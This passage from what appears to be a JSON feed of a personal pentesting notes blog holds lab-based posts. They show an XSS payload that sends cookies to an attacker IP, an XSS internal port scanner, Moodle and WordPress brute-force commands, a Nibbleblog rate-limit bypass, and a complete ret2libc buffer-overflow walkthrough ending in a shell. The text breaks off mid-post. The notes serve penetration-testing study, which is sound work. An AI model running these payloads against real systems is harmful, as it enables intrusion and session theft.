class=\"s1\">'http://10.10.39.208/log/'</span>+document.cookie&lt;/script&gt;</code></pre></div></div><ul>  <li>Refresh the page</li>  <li>Go to <code class=\"language-plaintext highlighter-rouge\">/logs</code></li></ul><p><img src=\"/spindel/assets/Cookie%20(Session)%20Hijacking/79797591-B0CB-47DA-A97A-26504675CB4D.png\" alt=\"\" /></p><h2 id=\"other-payloads\">Other payloads</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># sent by server -&gt; cookie: denied</span>cookie: granted</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB RedCross</li>  <li><a href=\"https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies\">Cookies Hacking - HackTricks</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/12/cookie-session-hijacking",
            
            
            
            "tags": ["web","xss"],
            
            "date_published": "2022-02-12T00:00:00+08:00",
            "date_modified": "2022-02-12T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/07/nibble",
            "title": "Nibble",
            "summary": "Nibble",
            "content_text": "Overview  No longer maintained  Successor is Bludit blogDefault Credentialsadmin:&lt;none&gt;Interesting URL Paths# contains version/README/admin/boot/rules/98-constants.bit# contains users/content/private/users.xml# others/admin.php/admin//content//content/private/plugins/my_image/db.xml/content/private/config.xmlIP BlacklistingNibbleblog blacklists an IP address for five minutes after five unsuccessful login attempts. We can confirm this configuration by checking  the source code .This can be bypassed by randomizing the X-Forwarded-For header. See bruteforce tool below.Exploits  Arbritraty File Upload Exploit (v4.0.3) - make sure to generate payload via msfvenom firstTools  Admin login page bruteforcerReferences  Nibbleblog - Easy, fast and free Blog system  eighty-two - Brute-forcing the admin password on Nibbles",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>No longer maintained</li>  <li>Successor is Bludit blog</li></ul><h2 id=\"default-credentials\">Default Credentials</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>admin:&lt;none&gt;</code></pre></div></div><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># contains version</span>/README/admin/boot/rules/98-constants.bit<span class=\"c\"># contains users</span>/content/private/users.xml<span class=\"c\"># others</span>/admin.php/admin//content//content/private/plugins/my_image/db.xml/content/private/config.xml</code></pre></div></div><h2 id=\"ip-blacklisting\">IP Blacklisting</h2><p>Nibbleblog blacklists an IP address for five minutes after five unsuccessful login attempts. We can confirm this configuration by checking  <a href=\"https://github.com/dignajar/nibbleblog/blob/2a5f242d89b85c0aae2df95c4c95bc627ade54fd/admin/boot/rules/3-variables.bit#L44-L45\">the source code</a> .</p><p>This can be bypassed by randomizing the <code class=\"language-plaintext highlighter-rouge\">X-Forwarded-For</code> header. See bruteforce tool below.</p><h2 id=\"exploits\">Exploits</h2><ul>  <li><a href=\"https://github.com/TheRealHetfield/exploits\">Arbritraty File Upload Exploit (v4.0.3)</a> - make sure to generate payload via msfvenom first</li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://eightytwo.net/blog/brute-forcing-the-admin-password-on-nibbles/\">Admin login page bruteforcer</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.nibbleblog.com/\">Nibbleblog - Easy, fast and free Blog system</a></li>  <li><a href=\"https://eightytwo.net/blog/brute-forcing-the-admin-password-on-nibbles/\">eighty-two - Brute-forcing the admin password on Nibbles</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/07/nibble",
            
            
            
            "tags": ["web","enum","cms","php"],
            
            "date_published": "2022-02-07T00:00:00+08:00",
            "date_modified": "2022-02-07T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/06/moodle",
            "title": "Moodle",
            "summary": "Moodle",
            "content_text": "OverviewCMS for online learning for studentsFinding Versionhttps://docs.moodle.org/34/en/Single_viewCredentialsSeems there are no default creds. But we can try these:moodlebox:Moodlebox4$moodlebox:moodleboxInteresting Paths# might contains versions/mod/forum/upgrade.txt/composer.lock# stringnames.txt contains a list of all the strings used during the install processinstall/stringnames.txt# others/backup/mod/chat/?id=1/INSTALL.txtBrute Force# Haven't confirmed if this is workingwfuzz -c -Z --hl 296,6 -X POST -H 'Cookie: MoodleSession=u0chdlm9finmc3sscsuggodg75' -d \"username=admin&amp;password=FUZZ\" -w /usr/share/wordlists/rockyou.txt 'http://teacher.htb/moodle/login/index.php'References  Moodle - HackTricks  Forgotten creds  Unauthenticated Exploit  Moodle Penetration Testing - MoodleDocs  Site backup - MoodleDocs",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>CMS for online learning for students</p><h2 id=\"finding-version\">Finding Version</h2><p>https://docs.moodle.org/34/en/Single_view</p><h2 id=\"credentials\">Credentials</h2><p>Seems there are no default creds. But we can try these:</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>moodlebox:Moodlebox4$moodlebox:moodlebox</code></pre></div></div><h2 id=\"interesting-paths\">Interesting Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># might contains versions</span>/mod/forum/upgrade.txt/composer.lock<span class=\"c\"># stringnames.txt contains a list of all the strings used during the install process</span><span class=\"nb\">install</span>/stringnames.txt<span class=\"c\"># others</span>/backup/mod/chat/?id<span class=\"o\">=</span>1/INSTALL.txt</code></pre></div></div><h2 id=\"brute-force\">Brute Force</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Haven't confirmed if this is working</span>wfuzz <span class=\"nt\">-c</span> <span class=\"nt\">-Z</span> <span class=\"nt\">--hl</span> 296,6 <span class=\"nt\">-X</span> POST <span class=\"nt\">-H</span> <span class=\"s1\">'Cookie: MoodleSession=u0chdlm9finmc3sscsuggodg75'</span> <span class=\"nt\">-d</span> <span class=\"s2\">\"username=admin&amp;password=FUZZ\"</span> <span class=\"nt\">-w</span> /usr/share/wordlists/rockyou.txt <span class=\"s1\">'http://teacher.htb/moodle/login/index.php'</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-web/moodle\">Moodle - HackTricks</a></li>  <li><a href=\"https://docs.moodle.org/311/en/Administration_FAQ#I_have_forgotten_the_admin_password\">Forgotten creds</a></li>  <li><a href=\"https://portswigger.net/daily-swig/finders-cheaters-rce-bug-in-moodle-e-learning-platform-could-be-abused-to-steal-data-manipulate-results\">Unauthenticated Exploit</a></li>  <li><a href=\"https://docs.moodle.org/dev/Moodle_Penetration_Testing\">Moodle Penetration Testing - MoodleDocs</a></li>  <li><a href=\"https://docs.moodle.org/311/en/Site_backup\">Site backup - MoodleDocs</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/06/moodle",
            
            
            
            "tags": ["web","enum","cms"],
            
            "date_published": "2022-02-06T00:00:00+08:00",
            "date_modified": "2022-02-06T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/02/xss-port-scanning",
            "title": "XSS Port Scanning",
            "summary": "XSS Port Scanning",
            "content_text": "OverviewAn attacker which is outside of your internal network can force you to browse a webpage containing malicuous javascript.This javascript code will scan your internal network and can be modified to send results back to attacker.Sample Code&lt;script&gt;  for (let i = 0; i &lt; 256; i++) {    let ip = '192.168.0.' + i    let code = '&lt;img src=\"http://' + ip + '/favicon.ico\" onload=\"this.onerror=null; this.src=/log/' + ip + '\"&gt;'    document.body.innerHTML += code }&lt;/script&gt;References  https://neonprimetime.blogspot.com/2015/09/cross-site-scripting-xss-that-port-scans.html",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>An attacker which is outside of your internal network can force you to browse a webpage containing malicuous javascript.</p><p>This javascript code will scan your internal network and can be modified to send results back to attacker.</p><h2 id=\"sample-code\">Sample Code</h2><div class=\"language-javascript highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&lt;</span><span class=\"nx\">script</span><span class=\"o\">&gt;</span>  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">let</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"mi\">256</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"kd\">let</span> <span class=\"nx\">ip</span> <span class=\"o\">=</span> <span class=\"dl\">'</span><span class=\"s1\">192.168.0.</span><span class=\"dl\">'</span> <span class=\"o\">+</span> <span class=\"nx\">i</span>    <span class=\"kd\">let</span> <span class=\"nx\">code</span> <span class=\"o\">=</span> <span class=\"dl\">'</span><span class=\"s1\">&lt;img src=\"http://</span><span class=\"dl\">'</span> <span class=\"o\">+</span> <span class=\"nx\">ip</span> <span class=\"o\">+</span> <span class=\"dl\">'</span><span class=\"s1\">/favicon.ico\" onload=\"this.onerror=null; this.src=/log/</span><span class=\"dl\">'</span> <span class=\"o\">+</span> <span class=\"nx\">ip</span> <span class=\"o\">+</span> <span class=\"dl\">'</span><span class=\"s1\">\"&gt;</span><span class=\"dl\">'</span>    <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">innerHTML</span> <span class=\"o\">+=</span> <span class=\"nx\">code</span> <span class=\"p\">}</span><span class=\"o\">&lt;</span><span class=\"sr\">/script</span><span class=\"err\">&gt;</span></code></pre></div></div><p><img src=\"/spindel/assets/XSS%20Port%20Scanning/23CD500A-C9DD-4F00-A473-8A1F9AE4F120.png\" alt=\"\" /></p><h2 id=\"references\">References</h2><ul>  <li>https://neonprimetime.blogspot.com/2015/09/cross-site-scripting-xss-that-port-scans.html</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/02/xss-port-scanning",
            
            
            
            "tags": ["web","enum","foothold","xss"],
            
            "date_published": "2022-02-02T00:00:00+08:00",
            "date_modified": "2022-02-02T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/01/ret2libc-system",
            "title": "Ret2libc - system()",
            "summary": "Ret2libc - system()",
            "content_text": "Overview  This makes use of existing libc by calling system(\"/bin/sh\")  You can use this attack on the following scenarios:          NX bit is set (e.g it it SEGFAULTS on NOPs \\x90909090)      GNU_STACK doesn’t contain RWE in readelf -l ./app output        Example below is from HTB Frolic boxSample Program➜  loot ./rop hello                                                                                      [+] Message sent: hello                                                                            ➜  loot Steps  Find what buffer length program crashes➜  loot ./rop `python2 -c \"print('A'*100)\"`                                                              [1]    325422 segmentation fault  ./rop `python2 -c \"print('A'*100)\"`➜  loot # it crashes at about 100 characters  Find the exact locaton of EIP➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A➜  loot ➜  loot gdb ./rop[...redacted...](gdb) disas vuln[...redacted...]   0x08048508 &lt;+16&gt;:\tcall   0x8048350 &lt;strcpy@plt&gt;   0x0804850d &lt;+21&gt;:\tadd    $0x10,%esp[...redacted...]   0x08048531 &lt;+57&gt;:\tret    End of assembler dump.(gdb) br *vuln+16Breakpoint 1 at 0x8048508(gdb) br *vuln+21Breakpoint 2 at 0x804850d(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2AStarting program: /home/kali/data/practice/hack_the_box/linux/frolic/results/frolic/loot/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2ABreakpoint 1, 0x08048508 in vuln ()(gdb) cContinuing.Breakpoint 2, 0x0804850d in vuln ()(gdb) info frameStack level 0, frame at 0xffffce20: eip = 0x804850d in vuln; saved eip = 0x62413762 called by frame at 0xffffce24 Arglist at 0xffffce18, args:  Locals at 0xffffce18, Previous frame's sp is 0xffffce20 Saved registers:  ebp at 0xffffce18, eip at 0xffffce1c(gdb) quit[...redacted...]➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762[*] Exact match at offset 52➜  loot # EIP offset is 52  Find base address of libc➜  loot ldd ./rop          \tlinux-gate.so.1 (0xf7fcf000)\tlibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dbc000)\t/lib/ld-linux.so.2 (0xf7fd1000)➜  loot # libc_base_addr = 0xf7dbc000  Find address of system().➜  loot readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system  1561: 00045160    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0➜  loot # system_addr = libc_base_addr + 00045160#             = 0xf7e01160  Find address of exit()➜  loot readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit   152: 00037af0    33 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.0[...redacted...]➜  loot # exit_addr = libc_base_addr + 00037af0#           = 0xf7df3af0  Find address of /bin/sh➜  loot strings -tx /lib/i386-linux-gnu/libc.so.6 | grep \"/bin/sh\" 18f924 /bin/sh➜  loot # bin_sh_addr = libc_base_addr + 18f924#             = F7F4B924  Construct payload# NOP + system_addr + exit_addr + bin_sh_addrpython2 -c \"print('A'*52 + '\\x60\\x11\\xe0\\xf7' + '\\xf0\\x3a\\xdf\\xf7' + '\\x24\\xb9\\xf4\\xf7')\"  Run and enjoy➜  loot ./rop `python2 -c \"print('A'*52 + '\\x60\\x11\\xe0\\xf7' + '\\xf0\\x3a\\xdf\\xf7' + '\\x24\\xb9\\xf4\\xf7')\"`$ iduid=1000(kali) gid=1000(kali) groups=1000(kali),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),120(wireshark),134(scanner),142(kaboxer)$ Gotchas  If you tried the steps above by getting a copy of vulnerable program and testing it on your local or attacker machine, you might need to change the memory addresses (libc_base_addr, system_addr, and bin_sh_addr) once you run it on the victim machine. That’s because memory address on victim might be different from the attacker machine.References  Introduction to exploiting Part 4 – ret2libc – Stack6 (Protostar)  Performing a ret2libc Attack - defeating a non-executable stack",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>This makes use of existing <code class=\"language-plaintext highlighter-rouge\">libc</code> by calling <code class=\"language-plaintext highlighter-rouge\">system(\"/bin/sh\")</code></li>  <li>You can use this attack on the following scenarios:    <ul>      <li>NX bit is set (e.g it it SEGFAULTS on NOPs <code class=\"language-plaintext highlighter-rouge\">\\x90909090</code>)</li>      <li><code class=\"language-plaintext highlighter-rouge\">GNU_STACK</code> doesn’t contain <code class=\"language-plaintext highlighter-rouge\">RWE</code> in <code class=\"language-plaintext highlighter-rouge\">readelf -l ./app</code> output</li>    </ul>  </li>  <li>Example below is from HTB Frolic box</li></ul><h2 id=\"sample-program\">Sample Program</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot ./rop hello                                                                                      <span class=\"o\">[</span>+] Message sent: hello                                                                            ➜  loot </code></pre></div></div><h2 id=\"steps\">Steps</h2><ul>  <li>Find what buffer length program crashes</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot ./rop <span class=\"sb\">`</span>python2 <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*100)\"</span><span class=\"sb\">`</span>                                                              <span class=\"o\">[</span>1]    325422 segmentation fault  ./rop <span class=\"sb\">`</span>python2 <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*100)\"</span><span class=\"sb\">`</span>➜  loot <span class=\"c\"># it crashes at about 100 characters</span></code></pre></div></div><ul>  <li>Find the exact locaton of EIP</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class=\"nt\">-l</span> 100Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A➜  loot ➜  loot gdb ./rop<span class=\"o\">[</span>...redacted...]<span class=\"o\">(</span>gdb<span class=\"o\">)</span> disas vuln<span class=\"o\">[</span>...redacted...]   0x08048508 &lt;+16&gt;:\tcall   0x8048350 &lt;strcpy@plt&gt;   0x0804850d &lt;+21&gt;:\tadd    <span class=\"nv\">$0x10</span>,%esp<span class=\"o\">[</span>...redacted...]   0x08048531 &lt;+57&gt;:\tret    End of assembler dump.<span class=\"o\">(</span>gdb<span class=\"o\">)</span> br <span class=\"k\">*</span>vuln+16Breakpoint 1 at 0x8048508<span class=\"o\">(</span>gdb<span class=\"o\">)</span> br <span class=\"k\">*</span>vuln+21Breakpoint 2 at 0x804850d<span class=\"o\">(</span>gdb<span class=\"o\">)</span> run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2AStarting program: /home/kali/data/practice/hack_the_box/linux/frolic/results/frolic/loot/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2ABreakpoint 1, 0x08048508 <span class=\"k\">in </span>vuln <span class=\"o\">()</span><span class=\"o\">(</span>gdb<span class=\"o\">)</span> cContinuing.Breakpoint 2, 0x0804850d <span class=\"k\">in </span>vuln <span class=\"o\">()</span><span class=\"o\">(</span>gdb<span class=\"o\">)</span> info frameStack level 0, frame at 0xffffce20: eip <span class=\"o\">=</span> 0x804850d <span class=\"k\">in </span>vuln<span class=\"p\">;</span> saved eip <span class=\"o\">=</span> 0x62413762 called by frame at 0xffffce24 Arglist at 0xffffce18, args:  Locals at 0xffffce18, Previous frame<span class=\"s1\">'s sp is 0xffffce20 Saved registers:  ebp at 0xffffce18, eip at 0xffffce1c(gdb) quit[...redacted...]➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762[*] Exact match at offset 52➜  loot # EIP offset is 52</span></code></pre></div></div><ul>  <li>Find base address of libc</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot ldd ./rop          \tlinux-gate.so.1 <span class=\"o\">(</span>0xf7fcf000<span class=\"o\">)</span>\tlibc.so.6 <span class=\"o\">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class=\"o\">(</span>0xf7dbc000<span class=\"o\">)</span>\t/lib/ld-linux.so.2 <span class=\"o\">(</span>0xf7fd1000<span class=\"o\">)</span>➜  loot <span class=\"c\"># libc_base_addr = 0xf7dbc000</span></code></pre></div></div><ul>  <li>Find address of <code class=\"language-plaintext highlighter-rouge\">system()</code>.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot readelf <span class=\"nt\">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class=\"nb\">grep </span>system  1561: 00045160    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0➜  loot <span class=\"c\"># system_addr = libc_base_addr + 00045160</span><span class=\"c\">#             = 0xf7e01160</span></code></pre></div></div><ul>  <li>Find address of <code class=\"language-plaintext highlighter-rouge\">exit()</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot readelf <span class=\"nt\">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class=\"nb\">grep exit   </span>152: 00037af0    33 FUNC    GLOBAL DEFAULT   14 <span class=\"nb\">exit</span>@@GLIBC_2.0<span class=\"o\">[</span>...redacted...]➜  loot <span class=\"c\"># exit_addr = libc_base_addr + 00037af0</span><span class=\"c\">#           = 0xf7df3af0</span></code></pre></div></div><ul>  <li>Find address of <code class=\"language-plaintext highlighter-rouge\">/bin/sh</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot strings <span class=\"nt\">-tx</span> /lib/i386-linux-gnu/libc.so.6 | <span class=\"nb\">grep</span> <span class=\"s2\">\"/bin/sh\"</span> 18f924 /bin/sh➜  loot <span class=\"c\"># bin_sh_addr = libc_base_addr + 18f924</span><span class=\"c\">#             = F7F4B924</span></code></pre></div></div><ul>  <li>Construct payload</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># NOP + system_addr + exit_addr + bin_sh_addr</span>python2 <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*52 + '</span><span class=\"se\">\\x</span><span class=\"s2\">60</span><span class=\"se\">\\x</span><span class=\"s2\">11</span><span class=\"se\">\\x</span><span class=\"s2\">e0</span><span class=\"se\">\\x</span><span class=\"s2\">f7' + '</span><span class=\"se\">\\x</span><span class=\"s2\">f0</span><span class=\"se\">\\x</span><span class=\"s2\">3a</span><span class=\"se\">\\x</span><span class=\"s2\">df</span><span class=\"se\">\\x</span><span class=\"s2\">f7' + '</span><span class=\"se\">\\x</span><span class=\"s2\">24</span><span class=\"se\">\\x</span><span class=\"s2\">b9</span><span class=\"se\">\\x</span><span class=\"s2\">f4</span><span class=\"se\">\\x</span><span class=\"s2\">f7')\"</span></code></pre></div></div><ul>  <li>Run and enjoy</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot ./rop <span class=\"sb\">`</span>python2 <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*52 + '</span><span class=\"se\">\\x</span><span class=\"s2\">60</span><span class=\"se\">\\x</span><span class=\"s2\">11</span><span class=\"se\">\\x</span><span class=\"s2\">e0</span><span class=\"se\">\\x</span><span class=\"s2\">f7' + '</span><span class=\"se\">\\x</span><span class=\"s2\">f0</span><span class=\"se\">\\x</span><span class=\"s2\">3a</span><span class=\"se\">\\x</span><span class=\"s2\">df</span><span class=\"se\">\\x</span><span class=\"s2\">f7' + '</span><span class=\"se\">\\x</span><span class=\"s2\">24</span><span class=\"se\">\\x</span><span class=\"s2\">b9</span><span class=\"se\">\\x</span><span class=\"s2\">f4</span><span class=\"se\">\\x</span><span class=\"s2\">f7')\"</span><span class=\"sb\">`</span><span class=\"nv\">$ </span><span class=\"nb\">id</span><span class=\"nv\">uid</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>kali<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>kali<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>kali<span class=\"o\">)</span>,20<span class=\"o\">(</span>dialout<span class=\"o\">)</span>,24<span class=\"o\">(</span>cdrom<span class=\"o\">)</span>,25<span class=\"o\">(</span>floppy<span class=\"o\">)</span>,27<span class=\"o\">(</span><span class=\"nb\">sudo</span><span class=\"o\">)</span>,29<span class=\"o\">(</span>audio<span class=\"o\">)</span>,30<span class=\"o\">(</span>dip<span class=\"o\">)</span>,44<span class=\"o\">(</span>video<span class=\"o\">)</span>,46<span class=\"o\">(</span>plugdev<span class=\"o\">)</span>,109<span class=\"o\">(</span>netdev<span class=\"o\">)</span>,118<span class=\"o\">(</span>bluetooth<span class=\"o\">)</span>,120<span class=\"o\">(</span>wireshark<span class=\"o\">)</span>,134<span class=\"o\">(</span>scanner<span class=\"o\">)</span>,142<span class=\"o\">(</span>kaboxer<span class=\"o\">)</span><span class=\"nv\">$ </span></code></pre></div></div><h2 id=\"gotchas\">Gotchas</h2><ul>  <li>If you tried the steps above by getting a copy of vulnerable program and testing it on your local or attacker machine, you might need to change the memory addresses (<code class=\"language-plaintext highlighter-rouge\">libc_base_addr</code>, <code class=\"language-plaintext highlighter-rouge\">system_addr</code>, and <code class=\"language-plaintext highlighter-rouge\">bin_sh_addr</code>) once you run it on the victim machine. That’s because memory address on victim might be different from the attacker machine.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://ironhackers.es/en/tutoriales/introduccion-al-exploiting-parte-4-ret2libc-stack-6-protostar/\">Introduction to exploiting Part 4 – ret2libc – Stack6 (Protostar)</a></li>  <li><a href=\"https://shellblade.net/files/docs/ret2libc.pdf\">Performing a ret2libc Attack - defeating a non-executable stack</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/01/ret2libc-system",
            
            
            
            "tags": ["bof","privesc"],
            
            "date_published": "2022-02-01T00:00:00+08:00",
            "date_modified": "2022-02-01T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/31/wordpress",
            "title": "Wordpress",
            "summary": "Wordpress",
            "content_text": "Version  On meta generators  Check interesting URL paths belowCredentials  Seems you really need to find valid credentials to wordpress before exploiting  Try going to /?author=1 and enumerate from there to see the usernames  There is no default credentials. Installation will ask user to provide the creds.  You can guess valid usernames thoughRecon# Kickoff nmapnmap -p80 --script http-wordpress-enum,http-wordpress-users 10.10.71.200# Using wpscan (you can remove api token but some# information will not be displayed)# NOTE: wpscan may not report all vulnerabilities specially# on pluginswpscan --url http://10.10.10.29 --api-token {API_TOKEN}# Similar to above but on another pathwpscan --url http://10.10.10.29/wordpress --api-token {API_TOKEN}  Check for colorlib in HTML elements. This is a WP plugin.Interesting URL Paths# you may find version here/wp-links-opml/wp-links-opml.php/readme.html# uploads directory/wp-content/uploads/YYYY/DD/FILENAME# login/wp-login.phpInteresting files# DB credentialswp-config.phpBrute Force# Using nmapmap -p80 --script http-wordpress-brute 10.10.10.29# User IDs can be extracted from here. You can use# burp sniper intruder and generate a list of user# id from 1 to 100 using bash for loop.curl -s -I -X GET http://10.10.10.29/?author=1# You can use this python script from# https://github.com/relarizky/wpxploit# This can take around 30 minutes to complete# TIP: try using \"admin\" as username firstcd ~/data/tools/webapp/wpxploit./exploit.py http://10.10.127.229/wordpress 5 15# You can also use wpscanwpscan --url http://10.10.127.229/wordpress --usernames admin --passwords /usr/share/wordlists/rockyou.txt  Once you have the credentials you can try uploading a PHP reverse shell  TIP: bruteforce is done by sending this POST data containing username and password&lt;methodCall&gt;  &lt;methodName&gt;    wp.getUsersBlogs  &lt;/methodName&gt;  &lt;params&gt;    &lt;param&gt;      &lt;value&gt;        admin      &lt;/value&gt;    &lt;/param&gt;    &lt;param&gt;      &lt;value&gt;        gansta1      &lt;/value&gt;    &lt;/param&gt;  &lt;/params&gt;&lt;/methodCall&gt;Interesting URL Paths# most can be reported by wpscan/wp-content/uploads//wp-admin//wp-admin/update-core.php/wp-admin/upgrade.php/install.php/wp-cron.php# can accept post requests if active/xmlrpc.php# others/plugins/wp-content/pluginsFor xmlrpc.php, you can use burpsuite to send some POST requests like this.POST /wordpress/xmlrpc.php HTTP/1.1Host: 10.10.10.29User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 95&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;XML RPC calls# List all method calls&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;# Get blogs&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;# Uploading a file&lt;?xml version='1.0' 